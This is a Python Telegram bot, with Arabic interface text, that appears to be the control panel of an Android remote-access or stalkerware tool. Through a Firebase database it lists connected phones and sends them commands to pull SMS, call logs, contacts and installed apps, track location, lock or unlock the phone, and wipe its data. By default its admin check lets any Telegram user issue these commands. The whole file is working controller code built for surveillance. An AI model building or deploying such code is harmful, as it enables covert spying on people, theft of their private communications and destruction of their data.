import os
import json
import time
import threading
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

BOT_TOKEN = os.environ.get("BOT_TOKEN", "ضع_التوكن_هنا")
FIREBASE_URL = os.environ.get("FIREBASE_URL", "https://your-project-default-rtdb.firebaseio.com")
ADMIN_ID = int(os.environ.get("ADMIN_ID", "0"))

def fb_get(path):
    try:
        r = requests.get(f"{FIREBASE_URL}/{path}.json", timeout=10)
        return r.json() if r.status_code == 200 else None
    except Exception as e:
        print(f"FB get error: {e}")
        return None

def fb_push(path, data):
    try:
        r = requests.post(f"{FIREBASE_URL}/{path}.json", json=data, timeout=10)
        return r.status_code == 200
    except Exception as e:
        print(f"FB push error: {e}")
        return False

def fb_put(path, data):
    try:
        r = requests.put(f"{FIREBASE_URL}/{path}.json", json=data, timeout=10)
        return r.status_code == 200
    except Exception as e:
        print(f"FB put error: {e}")
        return False

def is_admin(uid):
    return ADMIN_ID == 0 or uid == ADMIN_ID

async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("غير مصرح.")
        return
    devices = fb_get("devices") or {}
    if not devices:
        await update.message.reply_text("⚠️ لا يوجد أجهزة متصلة حالياً.")
        return

    kb = []
    for did, info in devices.items():
        model = info.get("model", "Unknown")
        status = info.get("status", "offline")
        emoji = "🟢" if status == "online" else "🔴"
        kb.append([InlineKeyboardButton(f"{emoji} {model} ({did[:6]})", callback_data=f"dev:{did}")])
    kb.append([InlineKeyboardButton("🔄 تحديث", callback_data="refresh")])

    await update.message.reply_text("📱 الأجهزة المتصلة:",
                                    reply_markup=InlineKeyboardMarkup(kb))

async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    data = q.data

    if not is_admin(q.from_user.id):
        return

    if data == "refresh":
        devices = fb_get("devices") or {}
        kb = []
        for did, info in devices.items():
            model = info.get("model", "Unknown")
            status = info.get("status", "offline")
            emoji = "🟢" if status == "online" else "🔴"
            kb.append([InlineKeyboardButton(f"{emoji} {model} ({did[:6]})", callback_data=f"dev:{did}")])
        kb.append([InlineKeyboardButton("🔄 تحديث", callback_data="refresh")])
        await q.edit_message_text("📱 الأجهزة المتصلة:", reply_markup=InlineKeyboardMarkup(kb))
        return

    if data.startswith("dev:"):
        did = data.split(":", 1)[1]
        kb = [
            [InlineKeyboardButton("📊 معلومات", callback_data=f"cmd:{did}:get_system_info"),
             InlineKeyboardButton("🔋 بطارية", callback_data=f"cmd:{did}:get_battery")],
            [InlineKeyboardButton("📞 مكالمات", callback_data=f"cmd:{did}:get_call_log"),
             InlineKeyboardButton("💬 SMS", callback_data=f"cmd:{did}:get_sms_log")],
            [InlineKeyboardButton("👥 جهات", callback_data=f"cmd:{did}:get_contacts"),
             InlineKeyboardButton("📱 تطبيقات", callback_data=f"cmd:{did}:get_installed_apps")],
            [InlineKeyboardButton("🔦 فلاش", callback_data=f"cmd:{did}:torch_on"),
             InlineKeyboardButton("📳 اهتزاز", callback_data=f"cmd:{did}:vibrate")],
            [InlineKeyboardButton("🔒 قفل", callback_data=f"cmd:{did}:lock"),
             InlineKeyboardButton("🔓 فتح", callback_data=f"cmd:{did}:unlock")],
            [InlineKeyboardButton("📍 موقع", callback_data=f"cmd:{did}:start_location_tracking"),
             InlineKeyboardButton("🗑️ مسح", callback_data=f"cmd:{did}:wipe_data")],
            [InlineKeyboardButton("◀️ رجوع", callback_data="refresh")],
        ]
        await q.edit_message_text(f"🎛️ التحكم بالجهاز:\n`{did}`",
                                  reply_markup=InlineKeyboardMarkup(kb),
                                  parse_mode="Markdown")
        return

    if data.startswith("cmd:"):
        _, did, cmd = data.split(":", 2)
        payload = {"type": cmd, "timestamp": int(time.time() * 1000)}
        ok = fb_push(f"commands/{did}", payload)
        await q.answer("✅ تم الإرسال" if ok else "❌ فشل", show_alert=True)
        return

def main():
    if not BOT_TOKEN or BOT_TOKEN == "ضع_التوكن_هنا":
        print("⚠️ ضع BOT_TOKEN في المتغيرات!")
        return

    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button))

    print("🤖 البوت يعمل...")
    app.run_polling()

if __name__ == "__main__":
    main()
